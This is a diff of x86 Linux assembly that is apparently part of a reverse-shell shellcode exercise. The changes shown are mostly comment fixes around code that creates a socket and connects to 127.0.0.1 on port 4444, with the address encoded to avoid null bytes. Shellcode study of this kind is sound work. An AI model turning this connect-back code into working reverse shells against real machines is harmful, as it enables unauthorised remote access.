@@ -14,10 +14,10 @@ section .text
 
     ;; Put the socket() args on the stack
     xor ecx, ecx
-    push ecx ; INADDR_ANY Accept on any interface 0x00000000
+    push ecx ; Protocol INADDR_ANY Accept on any interface 0x00000000
     push ebx ; SOCK_STREAM is the type of socket 1
 
-    push 0x2 ; protocol af_inet is the ip protocol 2
+    push 0x2 ; Domain af_inet sets protocol family to ip protocol 2
 
     mov ecx, esp ; save pointer to args for the socket() call
     int 0x80 ; call sys_socket
@@ -25,7 +25,6 @@ section .text
     ; save the returned listening socket file descriptor
     xor edi, edi
     mov edi, eax
-
 
     ;; Connect on the socket
     xor eax, eax
@@ -45,10 +44,9 @@ section .text
     ;; move it into a register
     ;; and then subtract
     xor ecx, ecx
-    mov ecx, 0x02010180 ; 0x0100007f
+    mov ecx, 0x02010180
     sub ecx, 0x01010101
     push ecx ; inet_addr("127.0.0.1) = 0x0100007f
-    ;;push 0x0101017f ; inet_addr("127.1.1.1")
 
     ;; 4444 is 0x115c in little endian. Network byte order is
     ;; Big endian so we swap the byte ordering
@@ -65,9 +63,11 @@ section .text
     ;; In the initial code we use sizeof to derive the addrlen
     ;; If we print the results of that we get 0x10 which is 16 bytes
     push 0x10 ;addrlen=16
-    push ecx  ;struct sockaddr pointer
+    push ecx  ;sockaddr_in struct pointer
     push edi  ;sockfd
-    mov ecx, esp ;save pointer to bind() args
+    mov ecx, esp ;save pointer to connect() args
+
+    ;; Bring ebx back to sys_call # 3 for connect()
     inc ebx
     int 0x80 ; call sys_connect
 
